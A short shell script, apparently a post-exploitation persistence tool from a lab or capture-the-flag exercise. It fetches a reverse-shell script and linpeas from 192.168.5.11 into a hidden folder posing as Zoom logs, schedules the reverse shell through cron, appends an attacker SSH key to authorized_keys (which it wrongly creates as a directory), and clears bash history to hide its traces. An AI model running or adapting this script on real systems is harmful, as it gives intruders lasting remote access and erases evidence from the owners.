#!/bin/sh

# Download scripts to obscure location
cd ~/.zoom/logs/
wget http://192.168.5.11:8000/victim/rev.sh
wget http://192.168.5.11:8000/victim/linpeas.sh

# Allow execution
chmod +x rev.sh
chmod +x linpeas.sh

# Add user cronjob
(crontab -l ; echo "* 6 * * * ~/.zoom/logs/rev.sh")|crontab 2> /dev/null

# Add ssh key
mkdir ~/.ssh
mkdir ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD4XWET4U7/cjkLSQRPOX3s1urmjAfSqxyLNd+U9lrqrEkXRGDM0RQpmjm/2uEsiFTRYYTjTaQm/1W4cFqKFO7NqkKH6OC0Oqdsrm+jz15zHWK1TR0FifTuVZCfK6nTIeQMBGv9jMRlUJjQuMfr52/lLG5OX+bDX1R07Z2rZy6dydVGyN1XyQDqT8RLlit7/Qrc6i4v04qLsFlqEQX2oqSpvfzJ4LOYtcAFPbMIUE3f0haaUy505kv1LKJC8to6US+Cqpte5LSrebnjEOY6U6LgWg+9kycTkvwSos+F5sThx//nBgDzBld6Ld0bgOLmWMYnRSZC86S46sZ+XV+TwhJvDlSJ4LE+LkYcYO5+c750PRO37yMvUzrUaR1VBKBeu++sDwA/GBLrmr0tpvWy/JHQA5798XMuJXgougfYI+KN+YgvqCyxWQbCz1kGsjhU5ZPfOeXIlRGw2zBIhZnn0p76wmBHZzh6Rv3qSLLabAHvFwcqmamSZ696EioA0KYe5Nk=" >> ~/.ssh/authorized_keys

# Delete bash history
echo "" > ~/.bash_history

echo "Done"
